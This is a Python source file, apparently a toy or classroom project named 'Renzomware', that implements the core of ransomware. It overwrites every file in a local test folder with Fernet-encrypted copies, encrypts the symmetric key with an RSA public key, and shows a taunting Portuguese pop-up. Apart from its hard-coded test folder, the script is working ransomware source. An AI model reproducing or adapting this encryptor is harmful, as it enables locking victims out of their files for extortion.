from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

from common import list_files, show_pop_up, PUBLIC_ASYM_KEY_FILE_NAME, SYM_KEY_FILE_NAME

import os


TEST_DIR_TO_ENCRYPT = f"{os.path.dirname(os.path.abspath(__file__))}/agentes_secretos"


def read_public_key(filename):
    with open(filename, "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read(),
            backend=default_backend()
        )

    return public_key


def generate_sym_key():
    key = Fernet.generate_key()
    return key


def encrypt_sym_key(sym_key, public_key, sym_key_filename):
    encrypted_key = public_key.encrypt(
        sym_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    with open(sym_key_filename, "wb") as encrypted_key_file:
        encrypted_key_file.write(encrypted_key)


def encrypt_file(filename, key):
    with open(filename, "rb") as file_to_encrypt:
        file_data = file_to_encrypt.read()

    encrypted_data = Fernet(key).encrypt(file_data)

    with open(filename, "wb") as encrypted_file:
        encrypted_file.write(encrypted_data)


def main():
    sym_key = generate_sym_key()

    filenames_list = list_files(TEST_DIR_TO_ENCRYPT)

    for filename in filenames_list:
        encrypt_file(filename,  sym_key)

    public_key = read_public_key(PUBLIC_ASYM_KEY_FILE_NAME)

    encrypt_sym_key(sym_key, public_key, SYM_KEY_FILE_NAME)

    show_pop_up("Toma um Renzomware!!", "Seus arquivos de gatinhos agora estão encriptados, muahaha!!")


if __name__ == "__main__":
    main()